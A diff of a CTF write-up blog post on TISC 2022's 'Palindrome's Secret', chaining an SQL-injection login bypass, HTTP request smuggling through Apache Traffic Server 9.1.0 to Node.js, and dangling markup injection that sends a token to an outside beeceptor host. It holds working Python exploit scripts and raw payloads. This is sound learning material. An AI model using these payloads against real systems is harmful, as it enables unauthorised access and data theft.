@@ -1,7 +1,7 @@
 ---
 title: "TISC 2022 Web Palindrome's Secret"
 date: 2022-09-12T00:05:00+08:00
-draft: true
+draft: false
 tags:
     - ctf
     - tisc-2022
@@ -328,7 +328,8 @@ Keep-Alive: timeout=5
 
 ```bash
 inmate@455383c8aaf4:~/app$ curl --url "http://localhost:8000/token" -H "Cookie: connect.sid=s%3AForqUI9QC1EH4IIG7ssnAddye3ZcLN1y.NYDgLr4jqh8UFtdOorml%2Bv2CFFhzHvZ3LQ8%2B5%2FnzTjI;"
-<!DOCTYPE html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>PALINDROME Portal</title><link href="/static/bootstrap.min.css" rel="stylesheet" type="text/css"><script defer src="/static/bootstrap.bundle.min.js"></script><link href="/static/main.css" rel="stylesheet"><script defer src="/static/particles.min.js"></script><script defer src="/static/main.js"></script></head><nav class="navbar navbar-expand-lg navbar-dark bg-dark"><button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNav"><ul class="navbar-nav ms-auto me-auto mb-2 mb-lg-0"><li class="nav-item active"><a class="nav-link" href="/index">Home</a></li><li class="nav-item"><a class="nav-link" href="/token">Get Token</a></li><li class="nav-item"><a class="nav-link" href="/verify">Verify Token</a></li><li class="nav-item"><a class="nav-link" href="/report-issue">Report an Issue</a></li></ul></div></nav><div class="container my-5" id="app"><h1>PALINDROME Access Tokens</h1><p></p>To ensure secure communication between our agents, you will be asked to identify yourself with access tokens.<p>Welcome back, !</p></p><p>Your token is TISC{0:1:2:3:4:5:6:6:8:9}</p></p></div>
+#### Omitted ####
+<p>Your token is TISC{0:1:2:3:4:5:6:6:8:9}</p></p></div>
 ```
 
 Woah woah woah, our (fake) flag is actually in the response! So it seems like a potential attack pattern would be to:
@@ -434,5 +435,284 @@ Ahhhh, okay so to put it in layman terms, `report.js` is doing the following:
 
 Let's for now, focus trying to make a request to the `POST /do-report` endpoint. After some research I came across this [HTTP Request Smuggling vulnerability for nodejs](https://security.snyk.io/vuln/SNYK-ALPINE316-NODEJSCURRENT-2953122) and with more googling around I eventually came across this [CVE](https://lists.apache.org/thread/rc64lwbdgrkv674koc3zl1sljr9vwg21) for the Apache Traffic Server 9.1.0 (which turns out to be similar to [SEETF 2022's](https://ctftime.org/event/1543) flagportal revenge challenge).
 
-Okay, so it seems like this challenge wants us to perform a HTTP Request Smuggling attack in order to bypass the proxy whitelist (as defined in the `remap.config`) and make a request directly to the application container itself. 
+Okay, so it seems like this challenge wants us to perform a HTTP Request Smuggling attack in order to bypass the proxy whitelist (as defined in the `remap.config`) and make a `POST /do-report` request directly through the application container itself.
 
+### Abusing Improper Chunk Extension Validations
+Let's first understand the conditions necessary for this HTTP Request Smuggling to work:
+- Apache Traffic Server 9.1.0 processe Line Feed (LF) (`\n`) as line endings instead of Carriage Return Line Feed (CRLF) (`\r\n`).
+- `lhttp` in NodejS v16.3.0 doesn't parse chunk extensions properly, but ignores every byte until a (CR) `\r` is reached.
+
+
+```bash 
+GET /login HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+
+2 ; xx
+f2
+0
+
+POST /do-report HTTP/1.1
+Host: app:8000
+Content-Type: application/json
+Content-Length: 37
+Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8
+
+{"url":"http://localhost:8000/token"}
+
+0
+
+```
+
+*If you're not familiar with how [Chunked Transfer Encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) works, I do suggest you read up about it a little before carrying on with the rest of this writeup*
+
+Let's try to understand what is happening. In the example above, `; xx` is treated as the [chunk extension](https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1) and `2` is intrepreted as the chunk size.
+
+Now, because ATS does not treat CRLF as the line ending but instead it treats LF as the line ending, we can modify the chunked extension to a payload like `\nxx` and as a result, ATS would see the following request:
+
+```bash
+GET /login HTTP/1.1
+Host: localhost
+Transfer-Encoding: chunked
+
+2 \nxx
+f2
+0
+
+POST /do-report HTTP/1.1
+Host: app:8000
+Content-Type: application/json
+Content-Length: 37
+Cookie: connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8
+
+{"url":"http://localhost:8000/token"}
+
+0
+
+``` 
+
+From ATS' perspective, it only sees a single request to `GET /login` and because of the first `0\r\n` (AKA the final byte indicator for chunked transfer encoding) ATS does not see beyond that.
+
+On the other hand, NodeJS actually sees both requests, the first request to `GET /login` as well as the second smuggled request, to `POST /do-report`. 
+
+`2 \nxx` actually gets ignored by NodeJS due to the lack of `\r` character and because of that, it ends up treating `f2` as the chunk size. We can then do some calculations to correctly pass in the correct chunk size to be interpreted by the NodeJS server.
+
+Finally, here's a python script that I used to generate the final payload to perform the request smuggling.
+
+```python
+import sys
+
+body = b'{"url":"http://localhost:8000/token"}'
+cookie = b"connect.sid=s%3AWJQuXDbK68vu2WoFyeYd_4BF7K83hYWC.M2PqksbXo5wLOai3PcCJSoKucZxS6JeJzsu3b56YPt8"
+
+smuggled = (
+    b"POST /do-report HTTP/1.1\r\n" +
+    b"Host: app:8000\r\n" +
+    b"Content-Type: application/json\r\n" +
+    b"Content-Length: " + str(len(body)).encode() + b"\r\n" +
+    b"Cookie: " + cookie + b"\r\n" +
+    b"\r\n" +  
+    body + b"\r\n"
+    b"\r\n" + 
+    b"0\r\n" +
+    b"\r\n"
+)
+
+def h(n):
+    return hex(n)[2:].encode()
+
+smuggled_len = h(len(smuggled) - 7 + 5)
+
+first_chunk_len = h(len(smuggled_len))
+
+sys.stdout.buffer.write(
+    b"GET /login HTTP/1.1\r\n" +
+    b"Host: localhost\r\n"+
+    b"Transfer-Encoding: chunked\r\n" +
+    b"\r\n" +
+    first_chunk_len + b" \n" + 
+    b"x"*len(smuggled_len) + b"\r\n" +
+    smuggled_len + b"\r\n" +
+    b"0\r\n" +
+    b"\r\n" +
+    smuggled
+)
+
+```
+
+I ran the script locally by running `python3 hrs.py | nc localhost 80`. We can verify that a request to `do-report` was made by inspecting the docker container logs (or alternatively point the `url` parameter in the `POST /do-report` endpoint to a self-controlled domain and inspect the request made).
+
+```bash
+└─$ docker logs --follow distrib_app_1
+[*] Visiting http://localhost:8000/token
+[*] Done visiting http://localhost:8000/token
+```
+
+*Credits to [zeyu2001](https://www.zeyu2001.com/) for the solution writeup on [flagportal revenge](https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/flagportal-revenge/solve.md), which helped me understand the whole HRS much better! Do checkout his website and his other writeups too :)*
+
+## Data Exfiltration via Dangling Markup Injection
+Okay, we have found a way to externally trigger the `POST /do-report` endpoint, but how do we exfiltrate the `req.session.token` data? Remember earlier on when we noticed the use of `puppeteer` and the potential idea of an XSS? Let's look at that!
+
+After some digging around, it seems like the `GET /token?token=<token>` endpoint has unsanitized reflected input when generating a token through `POST /token`.
+
+Initially I tried injecting XSS payloads but all of which seemed to not execute, making me realise that an XSS was (probably) not possible.
+
+I decided to analyse the `Content-Security-Policy` to understand further and voila, a realisation!
+
+```javascript
+app.use((req, res, next) => {
+    res.setHeader(
+        'Content-Security-Policy',
+        "default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
+    )
+    res.setHeader(
+        'Cross-Origin-Opener-Policy',
+        'same-origin'
+    )
+    next()
+})
+```
+
+Hmmm, turns out the CSP does indeed allow the loading of external image sources. I started looking around for other forms of **non-xss** client based attacks and eventually I came across [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup), which seemed rather promising.
+
+I tried to generate a token with the `username` payload, using [beeceptor](https://beeceptor.com/) as a way to inspect my request. If the image does load a request would be triggered to my temporary `beeceptor` endpoint.
+
+```html
+"/><img src="https://test-dangling-markup.free.beeceptor.com?
+```
+
+And success! I can see the a request being triggered and the query parameter in my `beeceptor` endpoint contains the exfiltrated response to the `GET /token?token=<generated_token>` endpoint as follows:
+
+```json
+{
+  " asks for your token, you can give them this token: TISC{a:q:a:c:n:s:w:g:o:4}.</div><form action": ""
+}
+```
+
+Let's make a script and automate this part!
+
+```python
+import requests
+import json
+
+url = "http://localhost"
+login_endpoint = f"{url}/login"
+token_endpoint = f"{url}/token"
+verify_endpoint = f"{url}/verify"
+
+login_payload = {"email": {"email":1}, "password": {"password":1}}
+
+r_login = requests.post(login_endpoint, json=login_payload)
+
+cookie = ""
+
+for c in r_login.cookies:
+    if c.name == "connect.sid":
+        cookie = f"{c.name}={c.value}"
+
+headers = {"Cookie": cookie}
+token_payload = {"username":"\"/><img src=\"https://test-dangling-markup.free.beeceptor.com?"}
+r_token = requests.post(token_endpoint, json=token_payload, headers=headers)
+print(r_token.json().get("token"))
+```
+
+## Putting it all together
+
+In the above sections we have demonstrated the following vulnerabilities:
+- An SQL Injection through improper type checking in `POST /login`
+- HTTP Request Smuggling to bypass ATS proxy, thus allowing a request to `POST /do-report`
+- A Dangling Markup Injection through `POST /token` and reflected in `GET /verify?token=<token>`
+
+Our attack pattern would involve the following:
+1. Retrieve an authentication cookie by exploiting the SQLi vulnerability
+2. Generate a token, injecting a dangling markup injection payload through the `username` parameter.
+3. Exploiting the HTTP Request Smuggling, make a request to the `POST /do-report` endpoint and pass in the `url` parameter the `GET /verify?token=<token_generated_in_step_2>`.
+
+Let's go ahead and automate the whole process with a script:
+
+```python
+import requests
+import json
+import sys
+import urllib.parse
+
+domain = "chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627"
+url = f"http://{domain}"
+login_endpoint = f"{url}/login"
+token_endpoint = f"{url}/token"
+verify_endpoint = f"{url}/verify"
+
+login_payload = {"email": {"email":1}, "password": {"password":1}}
+
+## Login Stuff
+r_login = requests.post(login_endpoint, json=login_payload)
+
+cookie = ""
+
+for c in r_login.cookies:
+    if c.name == "connect.sid":
+        cookie = f"{c.name}={c.value}"
+
+## Generate dangling markup injection token
+headers = {"Cookie": cookie}
+token_payload = {"username":"\"/><img src=\"https://test-dangling-markup.free.beeceptor.com?"}
+r_token = requests.post(token_endpoint, json=token_payload, headers=headers)
+bad_token = urllib.parse.quote(r_token.json().get("token"))
+
+## Perform HTTP Request Smuggling
+
+body = '{"url":"http://localhost:8000/verify?token=' + bad_token + '"}'
+body = body.encode()
+cookie = cookie.encode()
+
+smuggled = (
+    b"POST /do-report HTTP/1.1\r\n" +
+    b"Host: app:8000\r\n" +
+    b"Content-Type: application/json\r\n" +
+    b"Content-Length: " + str(len(body)).encode() + b"\r\n" +
+    b"Cookie: " + cookie + b"\r\n" +
+    b"\r\n" +  
+    body + b"\r\n"
+    b"\r\n" + 
+    b"0\r\n" +
+    b"\r\n"
+)
+
+def h(n):
+    return hex(n)[2:].encode()
+
+smuggled_len = h(len(smuggled) - 7 + 5)
+
+first_chunk_len = h(len(smuggled_len))
+
+sys.stdout.buffer.write(
+    b"GET /login HTTP/1.1\r\n" +
+    b"Host: " + domain.encode() + b"\r\n" + 
+    b"Transfer-Encoding: chunked\r\n" +
+    b"\r\n" +
+    first_chunk_len + b" \n" + 
+    b"x"*len(smuggled_len) + b"\r\n" +
+    smuggled_len + b"\r\n" +
+    b"0\r\n" +
+    b"\r\n" +
+    smuggled
+)
+
+```
+
+And now if we were to inspect our mock endpoint on `beeceptor`, we would see the flag in the query parameter as follows!: 
+
+```json
+{
+  " asks for your token, you can give them this token: TISC{1:3:3:7:l:3:4:k:1:n}.</div><form action": ""
+}
+```
+
+## Wrapping it all up like a burrito
+If you're reading this, thank you for reading this whole writeup! I personally had a lot of fun learning about these interesting forms of web vulnerabilities and I finally had a chance to exploit a HTTP Request Smuggling vulnerability...
+
+Okay technically I had that chance during SEETF2022 as well but I was busy learning about exploiting smart-contracts. Do check out my [SEETF2022 write-ups](https://quentinkhoo.github.io/tags/seetf-2022/) as well!
+
+Also if anything, I learned that parameterized queries does not ALWAYS protect you from an SQL Injection.....hmmm interesting, and yea, XSS is NOT the only form of client-side attack.
+
+Shoutout to [CSIT](https://www.csit.gov.sg/) for organising this CTF, and do check out my other [TISC-2022 writeups](https://quentinkhoo.github.io/tags/tisc-2022/) too! :)
